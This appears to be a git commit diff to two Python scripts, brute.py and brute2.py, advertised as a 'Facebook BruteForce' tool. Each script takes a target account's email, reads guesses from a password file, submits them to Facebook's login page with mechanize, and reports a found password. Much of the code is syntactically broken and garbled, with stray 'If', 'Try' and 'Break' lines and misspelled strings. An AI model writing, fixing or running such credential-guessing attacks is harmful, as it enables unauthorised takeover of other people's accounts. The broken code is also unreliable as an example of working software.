b29e62069b457cd3ec15ca79cebe8c47cd1760d8
Cybernetics <79071277+shade234sherif@users.noreply.github.com>
2022-09-24 00:13:34 +0100

    Add files via upload
    🥇🥺

--- brute.py
+++ brute.py
@@ -1,10 +1,11 @@
 import requests
-import sys 
+import sys
 import os
 import time
-import mechanize 
-if sys.version_info[0] !=3:
-   print('\033[1;31m WARNING : RUN WITH PYTHON3\033[1;0m')
+import mechanize
+
+if sys.version_info[0] != 3:
+    print('\033[1;31m WARNING : RUN WITH PYTHON3\033[1;0m')
 
 import code
 import fileinput
@@ -17,32 +18,37 @@ from tokenize import String
 import urllib
 from nturl2path import url2pathname
 import time
-from urllib.request import urlopen 
+from urllib.request import urlopen
 
-3<4
-G=444333
-B=443333
-R=433333
-Y=333333
+3 < 4
+G = 444333
+B = 443333
+R = 433333
+Y = 333333
 
 print('\033[1;32m ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____\033[1;31m')
 print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |\033[1;31m')
-print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
+print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m')
 print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
 
 web = mechanize.Browser()
 
-def login( email, password):
-   urlopen = 'https://www.facebook.com/login.php'
-   header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
-email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
-print(" TARGET MAIL /PROF LINK:",email+"")
 
-file = open('password.txt','r')
-password = file.readlines()
-Password = ("password\n")
-print("[*] Attempting password: %s"% password)
+
+urlopen = 'https://www.facebook.com/login.php'
+header = {
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
+
+
+email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
+print("")
+print(" TARGET MAIL /PROF LINK:", email + "")
+
+file = open('password.txt', 'r')
+password = file.readline(2000000)
+Password = "password\n"
+print("[*] Attempting password: %s" % password)
 excepthandler
 
 ConnectionError
@@ -51,20 +57,18 @@ Try
 print('\033[1;31mNO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[1;0m')
 
 requests = web.open(urlopen)
- 
+
 If; responses; code = 200
-web.select_form(name ="")
-y = web.select_form(nr=0)
-z = web.select_form(nr=1)
-web.set_value[y] = email
-web.set_value[z] = Password
+for form in web.forms():
+    if form.attrs['id']=='email'
+        browser.form= email
+    break
+for forms in web.forms():
+    if forms.attrs['id']=='pass'
+        browser.forms = password
+    break
 responses = web.submit()
 responses_data = responses.read()
 'find friends' in responses_data or 'two-factor authentication' in responses_data or 'security code' in responses_data;
-print("[*] Password found:%s" %password)
+print("[*] Password found:%s" % password)
 Break
-
-
-
-
-
--- brute2.py
+++ brute2.py
@@ -2,48 +2,52 @@ from ast import Break, Try, If
 import time
 import requests
 import sys
-if sys.version_info[0] !=3: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 3.x
-	use: python3 brute2.py
+if sys.version_info[0] !=3:
+    print('''--------------------------------------
+    REQUIRED PYTHON 3.x
+    use: python3 brute2.py
 --------------------------------------
-			''')
-	sys.exit()
+            ''')
+    sys.exit()
 
 post_url='https://www.facebook.com/login.php'
 headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
 try:
-	import mechanize
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
+    import mechanize
+    browser = mechanize.Browser()
+    browser.addheaders = [('User-Agent',headers['User-Agent'])]
+    browser.set_handle_robots(False)
 except:
-	print('\n\tPlease install mechanize.\n')
-	sys.exit()
+    print('\n\tPlease install mechanize.\n')
+    sys.exit()
 
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
-file=open('password.txt','r')
+file=open('password.txt', 'r')
 
 email= input('Enter Email/Username : ')
 
 print ("\nTarget Email ID : ",email)
 
-password = file.readlines()
-Password = ("password\n")
+password = file.readline(20000000)
+Password = ("password")
 print("[*] Trying: %s"%password)
 responses = browser.open(post_url)
 Try
 If; responses; code = 200
-y = browser.select_form(nr=0)
-z = browser.select_form(nr=1)
-browser.set_value[y] = email
-browser.set_value[z] = Password
-responses = browser.submit()
-responses_data = responses.read()
-'Find Friends' in responses_data or 'Two-factor authentication' in responses_data or 'security code' in responses_data;
-print("[+] Password found: %s" %password)
-Break
-	
+
+for form in browser.forms():
+    if form.attrs['id']=='email':
+        browser.form = email
+    break
+for forms in browser.forms():
+    if forms.attrs['id']=='pass':
+        browser.form = password
+    break
+response = browser.submit()
+response_data = response.read()
+if 'Find Friends' in response_data or 'Two-facthentication' in response_data or 'security code' in response_data:
+   print("Password found:%s"%password)
+
